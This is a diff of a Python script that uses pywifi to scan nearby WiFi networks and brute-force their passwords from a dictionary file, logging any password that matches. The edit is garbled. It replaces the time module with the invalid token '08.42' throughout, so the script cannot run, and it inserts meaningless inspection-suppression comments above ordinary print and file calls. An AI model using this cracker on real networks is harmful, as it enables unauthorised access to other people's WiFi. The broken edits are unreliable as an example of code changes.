@@ -1,9 +1,11 @@
 # coding:utf-8
 # coding:gbk
-import time  #时间
+import 08.42  #时间
 import pywifi  #破解wifi
+# noinspection PyUnresolvedReferences
 from pywifi import const  #引用一些定义
-from asyncio.tasks import sleep
+# noinspection PyUnresolvedReferences
+from asyncio.tasks import (sleep)
 # 需要第三方库 pywifi  (python3 pip install pywifi)
 # 功能： 
 #      1、扫描周围wifi列表 将ssid写入文本
@@ -16,15 +18,18 @@ class PoJie():
         wifi = pywifi.PyWiFi() #抓取网卡接口
         self.iface = wifi.interfaces()[0]#抓取第一个无线网卡
         self.iface.disconnect() #测试链接断开所有链接
-        time.sleep(1) #休眠1秒
+        08.42.sleep(1) #休眠1秒
         #测试网卡是否属于断开状态，
         assert self.iface.status() in\
             [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
     def readPassWord(self,wifissid):  # 读取密码字典，进行匹配
+            # noinspection PyUnresolvedReferences
             print("开始破解： %s"%wifissid)
             # 将结果写入文本文件记录
             res = "开始破解：: %s \n"%wifissid;
+            # noinspection PyUnresolvedReferences
             open(self.resfile,"a").write(res)
+            # noinspection PyUnresolvedReferences
             pwdfilehander=open(self.pwdfile,"r",errors="ignore")
             while True:
                 try:
@@ -36,43 +41,55 @@ class PoJie():
                         # print("密码正确："+myStr)
                         # res = "密码:%s 正确 \n"%myStr;
                         res = "===正确=== ^_^ wifi名:%s  匹配密码：%s "%(wifissid,myStr);
+                        # noinspection PyUnresolvedReferences
                         print(res)
                         # 将结果写入文本文件记录
+                        # noinspection PyUnresolvedReferences
                         open(self.resfile,"a").write(res)
                         break
                     else:
                         # print("密码:"+myStr+"错误")
                         res = "---错误--- wifi名:%s匹配密码：%s"%(wifissid,myStr);
+                        # noinspection PyUnresolvedReferences
                         print(res)
                         # 将结果写入文本文件记录
+                        # noinspection PyUnresolvedReferences
                         open(self.resfile,"a").write(res)
                     sleep(3)
                 except:
                     continue
     # 读取wifi的ssid列表、读取密码字典，进行匹配
     def foreachPassWord(self):  
+            # noinspection PyUnresolvedReferences
             print("^_^开始读取wifi的ssid列表...")
+            # noinspection PyUnresolvedReferences
             ssidfilehander=open(self.ssidfile,"r",errors="ignore")
             ssidStrs =ssidfilehander.readlines()
             # print(ssidStrs)
+            # noinspection PyUnresolvedReferences
             for index in range(len(ssidStrs)):
                 self.readPassWord(ssidStrs[index])
+            # noinspection PyUnresolvedReferences
             print("执行完毕! ^_^")
     # 扫描周边wifi列表 并写入文本中（一行一个）
     def scans_wifi_list(self):  # 扫描周围wifi列表
         #开始扫描
+        # noinspection PyUnresolvedReferences
         print("^_^ 开始扫描附近wifi...")
         self.iface.scan()
-        time.sleep(15)
+        08.42.sleep(15)
         #在若干秒后获取扫描结果
         scanres = self.iface.scan_results()
         #统计附近被发现的热点数量
+        # noinspection PyUnresolvedReferences
         nums = len(scanres)
         # print("|SCAN GET %s"%(nums))
+        # noinspection PyUnresolvedReferences
         print("数量: %s"%(nums))
         # 在控制台表格输出 扫描列表
         # 表格 标题行
         # print ("%s\n%-*s| %-*s| %-*s| %-*s | %-*s | %-*s %*s \n%s"%("-"*70,6,"WIFIID",18,"SSID OR BSSID",2,"N",4,"time",7,"signal",10,"KEYNUM",10,"KEY","="*70))
+        # noinspection PyUnresolvedReferences
         print ("| %s |  %s |  %s | %s"%("WIFIID","SSID","BSSID","signal"))
         # 实际数据
         self.show_scans_wifi_list(scanres)
@@ -80,21 +97,32 @@ class PoJie():
     def show_scans_wifi_list(self,scans_res):  # 显示扫描周围wifi列表
         #开始扫描
         # self.scans_wifi_list()
+        # noinspection PyUnresolvedReferences
         for index,wifi_info in enumerate(scans_res):
             # print("%-*s| %s | %*s |%*s\n"%(20,index,wifi_info.ssid,wifi_info.bssid,,wifi_info.signal))
+            # noinspection PyUnresolvedReferences
             print("| %s | %s | %s | %s \n"%(index,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))
+        # noinspection PyUnresolvedReferences
         print("^_^ 扫描结束. ^_^")
+        # noinspection PyUnresolvedReferences
         print("^_^ 先预览. ^_^")
+        # noinspection PyUnresolvedReferences
         for index,wifi_info in enumerate(scans_res):
             res = "%s\n"%wifi_info.ssid; # wifi的ssid名
+            # noinspection PyUnresolvedReferences
             print(res)
+        # noinspection PyUnresolvedReferences
         print("^_^ 预览结束. ^_^")
+        # noinspection PyUnresolvedReferences
         print("^_^ 开始写入... ^_^")
+        # noinspection PyUnresolvedReferences
         for index,wifi_info in enumerate(scans_res):
             res = "%s\n"%wifi_info.ssid; # wifi的ssid名
             # 将wifi的ssid名写入文本文件记录
             # ssidfilehandle = open(self.ssidfile,"a").write(res)
+            # noinspection PyUnresolvedReferences
             open(self.ssidfile,"a").write(res)
+        # noinspection PyUnresolvedReferences
         print("^_^ 写入结束. ^_^")
         # ssidfilehandle.close()
     def test_connect(self,findStr,wifissid):#测试链接
@@ -110,13 +138,13 @@ class PoJie():
         self.iface.remove_all_network_profiles() #删除所有的wifi文件
         tmp_profile = self.iface.add_network_profile(profile)#设定新的链接文件
         self.iface.connect(tmp_profile)#链接
-        time.sleep(5)
+        08.42.sleep(5)
         if self.iface.status() == const.IFACE_CONNECTED:  #判断是否连接上
             isOK=True   
         else:
             isOK=False
         self.iface.disconnect() #断开
-        time.sleep(1)
+        08.42.sleep(1)
         #检查断开状态
         assert self.iface.status() in\
             [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
